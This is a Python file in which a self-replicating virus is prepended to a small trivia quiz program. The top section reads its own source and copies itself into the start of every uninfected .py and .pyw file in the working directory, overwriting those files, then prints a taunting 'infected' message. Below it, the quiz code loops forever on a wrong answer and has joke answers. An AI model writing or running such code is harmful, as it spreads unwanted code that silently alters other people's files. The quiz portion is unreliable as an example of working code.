# VIRUS SAYS HI!

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)


def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")


malicious_code()

# VIRUS SAYS BYE!
def get_questions():
    return [
     ["Whats 9 + 10? : ", "21"],
     ["Inventor of the Rick roll? : ", "Rick Astley"],
     ["Now imagine a race and you have passed the second place runner, now at what position are you? : ", "2nd"],
     ["The more there is the less you see, what am i? : ", "Darkness"],
     ["What is at the end of a rainbow? : ", "w"]
    ]


def check_questions(row):
    q = row[0]
    a = row[1]

    user_ans = input(q)
    if user_ans == a:
        print("Correct!")
        return True
    else:
        print(f"Incorrect!, the correct answer was : {a}")
        return False


def main(question_bank):

    if len(question_bank) == 0:
        print("No questions were given.")
        return None

    index = 0
    right = 0
    while index < len(question_bank):
        if check_questions(question_bank[index]):
            right += 1

            index += 1
        print(f"Your score is {right/len(question_bank)*100}")


main(get_questions())
